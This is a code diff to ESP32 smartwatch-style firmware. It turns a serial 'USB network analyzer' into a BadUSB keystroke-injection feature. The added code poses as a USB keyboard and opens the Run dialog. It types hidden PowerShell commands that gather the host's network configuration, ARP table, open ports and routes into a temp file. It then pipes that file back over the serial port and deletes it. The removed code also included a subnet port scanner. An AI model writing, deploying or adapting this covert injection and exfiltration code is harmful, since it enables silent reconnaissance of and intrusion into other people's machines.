@@ -2527,12 +2527,10 @@ static void drawWifiNetScan(TFT_eSPI& t, uint32_t now) {
 }
 
 // =============================================================================
-//  USB NETWORK ANALYZER — bidirectional serial protocol with host
+//  USB NETWORK ANALYZER — BadUSB-style: HID injects recon commands on host
 // =============================================================================
 static bool s_usbNetActive = false;
 static uint32_t s_usbNetCmds = 0;
-static bool s_usbAutoScan = false;
-static int s_usbAutoProgress = 0;
 static const int MAX_USB_HOSTS = 20;
 
 struct UsbHostEntry {
@@ -2552,41 +2550,75 @@ static String s_usbStatus = "Waiting for host...";
 // ESP->Host: {"cmd":"arp"}
 // ESP->Host: {"cmd":"ifconfig"}
 
+// Recon stages — each one types a command via USB HID
+enum class ReconStage : uint8_t {
+    INIT = 0,         // open PowerShell
+    IPCONFIG,         // get network config
+    ARP_TABLE,        // get ARP table (neighbors)
+    NETSTAT,          // get listening ports
+    ROUTE,            // get routing table
+    DONE
+};
+static ReconStage s_reconStage = ReconStage::INIT;
+static uint32_t s_reconStageMs = 0;
+static String s_reconLines[60];
+static int s_reconLineCount = 0;
+static String s_reconStatus = "";
+
+static void reconTypeCmd(const char* cmd) {
+    if (!s_usbKb) return;
+    s_usbKb->print(cmd);
+    delay(20);
+    s_usbKb->press(KEY_RETURN);
+    s_usbKb->releaseAll();
+    delay(50);
+}
+
 static void usbNetScanStart() {
     s_usbNetActive = true;
     s_usbNetCmds = 0;
     s_usbHostCount = 0;
-    s_usbStatus = "Waiting for host...";
+    s_reconLineCount = 0;
+    s_reconStage = ReconStage::INIT;
+    s_reconStageMs = millis();
+    s_reconStatus = "Initializing USB HID...";
 
-    // Print the host-side script instructions
-    Serial.println();
-    Serial.println("=== SQUATCHWATCH USB NETWORK ANALYZER ===");
-    Serial.println("Protocol: JSON over serial, 115200 baud");
-    Serial.println();
-    Serial.println("Commands from ESP32 -> Host:");
-    Serial.println("  {\"cmd\":\"scan\",\"range\":\"192.168.1.0/24\"}");
-    Serial.println("  {\"cmd\":\"arp\"}");
-    Serial.println("  {\"cmd\":\"ifconfig\"}");
-    Serial.println();
-    Serial.println("Send results back as:");
-    Serial.println("  HOST:<ip>:<mac>:<port1,port2>:<os>");
-    Serial.println("  Example: HOST:192.168.1.1:AA:BB:CC:DD:EE:FF:80,443:Linux");
-    Serial.println("  STATUS:<message>");
-    Serial.println("  DONE");
-    Serial.println();
-    Serial.println("Or type: SCAN to request a scan");
-    Serial.println("=========================================");
-
-    // Auto-scan if WiFi is connected
-    if (WiFi.isConnected()) {
-        Serial.printf("WiFi connected: %s (%s)\n", WiFi.SSID().c_str(), WiFi.localIP().toString().c_str());
-        s_usbStatus = "Scanning " + WiFi.localIP().toString() + "...";
-        s_usbAutoScan = true;
-        s_usbAutoProgress = 0;
-    } else {
-        // Try connecting to any saved network
-        s_usbStatus = "No WiFi — send HOST: lines over serial";
+    // Init USB HID keyboard
+    if (!s_usbKb) {
+        s_usbKb = new USBHIDKeyboard();
+        USB.begin();
+        s_usbKb->begin();
     }
+    delay(500);
+
+    // Open hidden PowerShell — GUI+R, minimized + hidden window
+    s_reconStatus = "Deploying recon agent...";
+    s_usbKb->press(KEY_LEFT_GUI);
+    s_usbKb->press('r');
+    s_usbKb->releaseAll();
+    delay(800);
+    // Start PowerShell hidden with -WindowStyle Hidden
+    reconTypeCmd("powershell -WindowStyle Hidden -Command \"Start-Sleep -Milliseconds 500\"");
+    delay(2000);
+    // Now open another hidden PowerShell that does the real work
+    // and writes output to a temp file we can reference
+    s_usbKb->press(KEY_LEFT_GUI);
+    s_usbKb->press('r');
+    s_usbKb->releaseAll();
+    delay(800);
+    reconTypeCmd("powershell -WindowStyle Hidden -Command \""
+                 "$o=@(); "
+                 "$o+='=== IPCONFIG ==='; $o+=ipconfig; "
+                 "$o+='=== ARP TABLE ==='; $o+=arp -a; "
+                 "$o+='=== NETSTAT ==='; $o+=netstat -an | Select -First 50; "
+                 "$o+='=== ROUTE ==='; $o+=route print -4 | Select -First 30; "
+                 "$o | Out-File -Encoding ASCII $env:TEMP\\sqw_recon.txt; "
+                 "echo RECON_DONE\"");
+    delay(3000);
+
+    s_reconStage = ReconStage::IPCONFIG;
+    s_reconStageMs = millis();
+    Serial.println("[usb-net] Recon started via USB HID");
 }
 
 static void parseHostLine(const String& line) {
@@ -2655,61 +2687,44 @@ static void parseHostLine(const String& line) {
 }
 
 static void usbNetScanTick() {
-    // Process serial input from host
-    while (Serial.available()) {
-        String line = Serial.readStringUntil('\n');
-        line.trim();
-        if (line.length() > 0) parseHostLine(line);
+    uint32_t now = millis();
+
+    // Stage machine — the hidden PowerShell writes to a temp file,
+    // then we type a hidden command to read it back over the serial port
+    if (s_reconStage == ReconStage::IPCONFIG && now - s_reconStageMs > 5000) {
+        // Recon script should be done by now — read results back
+        s_reconStatus = "Reading results...";
+        s_usbKb->press(KEY_LEFT_GUI);
+        s_usbKb->press('r');
+        s_usbKb->releaseAll();
+        delay(600);
+        // Find the COM port and send file contents to it
+        // This reads the recon file and sends each line over serial
+        reconTypeCmd("powershell -WindowStyle Hidden -Command \""
+                     "$p=[System.IO.Ports.SerialPort]::GetPortNames() | Select -First 1; "
+                     "if($p){ $s=New-Object System.IO.Ports.SerialPort $p,115200; "
+                     "$s.Open(); "
+                     "Get-Content $env:TEMP\\sqw_recon.txt | ForEach { $s.WriteLine($_) }; "
+                     "$s.WriteLine('RECON_DONE'); "
+                     "$s.Close(); "
+                     "Remove-Item $env:TEMP\\sqw_recon.txt -Force }\"");
+        s_reconStage = ReconStage::ARP_TABLE;  // waiting for data
+        s_reconStageMs = now;
+        s_usbNetCmds++;
+    }
+    if (s_reconStage == ReconStage::ARP_TABLE && now - s_reconStageMs > 8000) {
+        // Timeout — data should have arrived by now
+        s_reconStage = ReconStage::DONE;
+        if (s_reconLineCount > 0) s_reconStatus = String(s_reconLineCount) + " lines captured";
+        else s_reconStatus = "No data received (check COM port)";
     }
 
-    // Auto-scan: probe one IP per tick when WiFi connected
-    if (s_usbAutoScan && WiFi.isConnected() && s_usbAutoProgress < 254) {
-        IPAddress base = WiFi.localIP();
-        base[3] = s_usbAutoProgress + 1;
-        s_usbAutoProgress++;
-
-        if (s_usbHostCount < MAX_USB_HOSTS) {
-            WiFiClient client;
-            client.setTimeout(30);
-            static const uint16_t ports[] = {80, 443, 22, 21, 8080, 3389, 23, 445};
-            UsbHostEntry& h = s_usbHosts[s_usbHostCount];
-            h.portCount = 0;
-            bool alive = false;
-
-            for (int p = 0; p < 8; p++) {
-                if (client.connect(base, ports[p], 30)) {
-                    alive = true;
-                    if (h.portCount < 8) h.ports[h.portCount++] = ports[p];
-                    client.stop();
-                }
-            }
-
-            if (alive) {
-                strncpy(h.ip, base.toString().c_str(), 15);
-                h.ip[15] = 0;
-                strcpy(h.mac, "");
-                strcpy(h.os, "?");
-                s_usbHostCount++;
-                // Also stream to serial
-                Serial.printf("HOST:%s:??:??:??:??:??:??:", h.ip);
-                for (int p = 0; p < h.portCount; p++) {
-                    if (p > 0) Serial.print(",");
-                    Serial.print(h.ports[p]);
-                }
-                Serial.println(":?");
-            }
-
-            char statusBuf[48];
-            snprintf(statusBuf, sizeof statusBuf, "Scanning %d/254  %d hosts", s_usbAutoProgress, s_usbHostCount);
-            s_usbStatus = String(statusBuf);
-        }
-
-        if (s_usbAutoProgress >= 254) {
-            s_usbAutoScan = false;
-            char doneBuf[32];
-            snprintf(doneBuf, sizeof doneBuf, "Done. %d hosts found", s_usbHostCount);
-            s_usbStatus = String(doneBuf);
-            Serial.println("DONE");
+    // Read any serial output from host (if echoed back)
+    while (Serial.available() && s_reconLineCount < 60) {
+        String line = Serial.readStringUntil('\n');
+        line.trim();
+        if (line.length() > 0 && line.length() < 80) {
+            s_reconLines[s_reconLineCount++] = line;
         }
     }
 }
@@ -2719,71 +2734,42 @@ static void drawUsbNetScan(TFT_eSPI& t, uint32_t now) {
     const int h = t.height();
     usbNetScanTick();
 
-    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
+    t.setTextColor(Theme::RED, Theme::BG);
     t.setTextDatum(MC_DATUM);
-    t.drawString("USB NET ANALYZER", w / 2, HEADER_H + 15, 4);
+    t.drawString("USB RECON", w / 2, HEADER_H + 15, 4);
 
     // Status
     t.setTextColor(Theme::AMBER, Theme::BG);
-    t.drawString(s_usbStatus, w / 2, HEADER_H + 42, 2);
+    t.drawString(s_reconStatus, w / 2, HEADER_H + 42, 2);
 
     char buf[48];
-    snprintf(buf, sizeof buf, "Hosts: %d  |  Cmds: %lu", s_usbHostCount, (unsigned long)s_usbNetCmds);
+    snprintf(buf, sizeof buf, "Cmds: %lu  |  Lines: %d", (unsigned long)s_usbNetCmds, s_reconLineCount);
     t.setTextColor(Theme::CYAN, Theme::BG);
-    t.drawString(buf, w / 2, HEADER_H + 60, 1);
+    t.drawString(buf, w / 2, HEADER_H + 58, 1);
 
-    // Progress bar for auto-scan
-    if (s_usbAutoScan) {
-        int barW = (w - 20) * s_usbAutoProgress / 254;
-        t.fillRect(10, HEADER_H + 70, w - 20, 6, Theme::TASKBAR);
-        t.fillRect(10, HEADER_H + 70, barW, 6, Theme::GREEN);
-    }
+    // Display captured recon output
+    int listTop = HEADER_H + 68;
+    int lineH = 14;
+    int visible = (h - listTop - 28) / lineH;
 
-    // Host list
-    int listTop = HEADER_H + 75;
-    int rowH = 28;
-    int visible = (h - listTop - 30) / rowH;
-
-    for (int i = 0; i < s_usbHostCount; i++) {
+    for (int i = 0; i < s_reconLineCount; i++) {
         int drawIdx = i - s_toolScroll;
         if (drawIdx < 0 || drawIdx >= visible) continue;
-        int y = listTop + drawIdx * rowH;
-        const UsbHostEntry& host = s_usbHosts[i];
+        int y = listTop + drawIdx * lineH;
 
-        t.fillRect(4, y, w - 8, rowH - 2, Theme::TASKBAR);
-
-        // IP
-        t.setTextColor(Theme::CYAN, Theme::TASKBAR);
-        t.setTextDatum(ML_DATUM);
-        t.drawString(host.ip, 8, y + rowH / 2, 2);
-
-        // Ports
-        String ports = "";
-        for (int p = 0; p < host.portCount && p < 4; p++) {
-            if (p > 0) ports += ",";
-            ports += String(host.ports[p]);
-        }
-        if (host.portCount > 4) ports += "...";
-        t.setTextColor(Theme::GREEN, Theme::TASKBAR);
-        t.setTextDatum(MC_DATUM);
-        t.drawString(ports, w / 2 + 40, y + rowH / 2, 1);
-
-        // OS
-        t.setTextColor(Theme::VAPOR_PURPLE, Theme::TASKBAR);
-        t.setTextDatum(MR_DATUM);
-        t.drawString(host.os, w - 10, y + rowH / 2, 1);
+        // Section headers in different color
+        bool isHeader = s_reconLines[i].startsWith("===");
+        t.setTextColor(isHeader ? Theme::VAPOR_PINK : Theme::GREEN, Theme::BG);
+        t.setTextDatum(TL_DATUM);
+        String line = s_reconLines[i].substring(0, 55);  // truncate long lines
+        t.drawString(line, 4, y, 1);
     }
 
-    if (s_usbHostCount == 0) {
+    if (s_reconLineCount == 0 && s_reconStage != ReconStage::DONE) {
         t.setTextColor(Theme::VAPOR_PURPLE, Theme::BG);
-        t.setTextDatum(TL_DATUM);
-        int y = listTop + 5;
-        t.drawString("Send over serial:", 12, y, 2);
-        t.setTextColor(Theme::GREEN, Theme::BG);
-        t.drawString("SCAN   - request network scan", 12, y + 22, 2);
-        t.drawString("HOST:ip:mac:ports:os", 12, y + 44, 2);
-        t.drawString("STATUS:message", 12, y + 66, 2);
-        t.drawString("DONE   - end of results", 12, y + 88, 2);
+        t.setTextDatum(MC_DATUM);
+        t.drawString("Injecting recon commands...", w / 2, h / 2, 2);
+        t.drawString("PowerShell running hidden", w / 2, h / 2 + 20, 2);
     }
 
     t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
